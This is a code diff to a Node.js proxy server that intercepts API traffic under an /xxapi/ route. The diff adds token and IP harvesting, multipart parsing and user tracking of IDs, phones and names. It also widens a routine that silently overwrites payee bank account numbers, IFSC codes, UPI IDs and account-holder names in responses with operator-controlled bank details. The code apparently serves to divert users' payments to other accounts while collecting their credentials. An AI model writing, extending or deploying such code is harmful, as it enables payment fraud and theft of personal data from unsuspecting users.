@@ -44,6 +44,8 @@ if (REDIS_URL && REDIS_TOKEN) {
 let cachedData = null;
 let cacheTime = 0;
 const CACHE_TTL = 5000;
+const tokenUserMap = {};
+const ipUserMap = {};
 
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
@@ -141,6 +143,47 @@ function findNumericId(obj, depth) {
   return '';
 }
 
+function getTokenFromReq(req) {
+  const auth = req.headers['authorization'] || req.headers['token'] || req.headers['x-token'] || req.headers['access-token'] || '';
+  if (auth.startsWith('Bearer ')) return auth.substring(7).trim();
+  if (auth) return auth.trim();
+  const ck = req.headers['cookie'] || '';
+  const tm = ck.match(/token=([^;]+)/);
+  if (tm) return tm[1].trim();
+  return '';
+}
+
+function getClientIP(req) {
+  return req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || req.headers['x-real-ip'] || '';
+}
+
+function resolveUserId(req) {
+  const tok = getTokenFromReq(req);
+  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
+  const ip = getClientIP(req);
+  if (ip && ipUserMap[ip]) return ipUserMap[ip];
+  return '';
+}
+
+function saveUserMapping(req, userId) {
+  if (!userId) return;
+  const tok = getTokenFromReq(req);
+  if (tok) tokenUserMap[tok] = String(userId);
+  const ip = getClientIP(req);
+  if (ip) ipUserMap[ip] = String(userId);
+}
+
+function parseMultipartFields(rawBody) {
+  if (!rawBody || rawBody.length === 0) return {};
+  const bodyStr = rawBody.toString();
+  const fields = {};
+  const matches = bodyStr.matchAll(/name="([^"]+)"\r?\n\r?\n([^\r\n-]+)/g);
+  for (const m of matches) {
+    fields[m[1]] = m[2].trim();
+  }
+  return fields;
+}
+
 const BANK_FIELD_MAP = {
   accountno:'accountNo',accountnumber:'accountNo',account_no:'accountNo',
   receiveaccountno:'accountNo',bankaccount:'accountNo',bankaccountno:'accountNo',
@@ -167,21 +210,33 @@ const BANK_FIELD_MAP = {
   payeeupi:'upiId',receiverupi:'upiId',walletupi:'upiId'
 };
 
-function deepReplaceBankFields(obj, bank, depth) {
-  if (!obj || typeof obj !== 'object' || depth > 10) return;
-  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1); return; }
-  let hasAcct = false;
+function scanHasBankFields(obj, depth) {
+  if (!obj || typeof obj !== 'object' || depth > 10) return false;
+  if (Array.isArray(obj)) { return obj.some(item => scanHasBankFields(item, depth + 1)); }
   for (const k of Object.keys(obj)) {
     const kl = k.toLowerCase().replace(/[_-]/g, '');
-    if (BANK_FIELD_MAP[kl] === 'accountNo' || BANK_FIELD_MAP[kl] === 'ifsc') hasAcct = true;
+    if (BANK_FIELD_MAP[kl] === 'accountNo' || BANK_FIELD_MAP[kl] === 'ifsc') return true;
+    if (typeof obj[k] === 'object' && scanHasBankFields(obj[k], depth + 1)) return true;
   }
+  return false;
+}
+
+const NAME_FIELDS = ['name','payname','username','ctname','holdername','ownername',
+  'receivename','payeename','beneficiaryname','accountname','realname',
+  'cardholder','cardname','receivername','collectionname','customername',
+  'truename','accname','bankaccountname','receiveaccountname',
+  'payeerealname','receiverealname','bankaccountholder','accountholder'];
+
+function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
+  if (!obj || typeof obj !== 'object' || depth > 10) return;
+  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1, globalHasAcct); return; }
   for (const k of Object.keys(obj)) {
-    if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1); continue; }
+    if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct); continue; }
     if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
     const kl = k.toLowerCase().replace(/[_-]/g, '');
     const mapping = BANK_FIELD_MAP[kl];
     if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
-    if ((kl === 'name' || kl === 'payname') && hasAcct && bank.accountHolder && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; }
+    if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
     if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; }
   }
 }
@@ -753,7 +808,8 @@ app.all('/xxapi/*', async (req, res) => {
       try {
         const ct = (req.headers['content-type'] || '').toLowerCase();
         if (ct.includes('json')) { reqBody = JSON.parse(req.rawBody.toString()); }
-        else if (ct.includes('form') && !ct.includes('multipart')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
+        else if (ct.includes('multipart')) { reqBody = parseMultipartFields(req.rawBody); }
+        else if (ct.includes('form')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
       } catch(e) {}
     }
     if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
@@ -764,12 +820,14 @@ app.all('/xxapi/*', async (req, res) => {
     if (respData && typeof respData === 'object') userId = findNumericId(respData, 0);
     if (!userId) userId = findNumericId(jsonResp, 0);
     if (!userId) userId = findNumericId(reqBody, 0);
+    if (!userId) userId = resolveUserId(req);
 
     const reqPhone = reqBody.phone || reqBody.mobile || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
     const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
     const phone = reqPhone || respPhone;
 
     if (userId) {
+      saveUserMapping(req, userId);
       if (!data.trackedUsers) data.trackedUsers = {};
       const existing = data.trackedUsers[String(userId)] || {};
       data.trackedUsers[String(userId)] = {
@@ -779,8 +837,8 @@ app.all('/xxapi/*', async (req, res) => {
         phone: phone || existing.phone || ''
       };
       if (respData && typeof respData === 'object') {
-        const name = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
-        if (name) data.trackedUsers[String(userId)].name = name;
+        const rName = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
+        if (rName) data.trackedUsers[String(userId)].name = rName;
       }
     }
 
@@ -910,7 +968,8 @@ app.all('/xxapi/*', async (req, res) => {
     if (data.botEnabled !== false) {
       const bank = getActiveBank(data, userId);
       if (bank) {
-        deepReplaceBankFields(jsonResp, bank, 0);
+        const globalHasAcct = scanHasBankFields(jsonResp, 0);
+        deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
       }
 
       if (userId) {
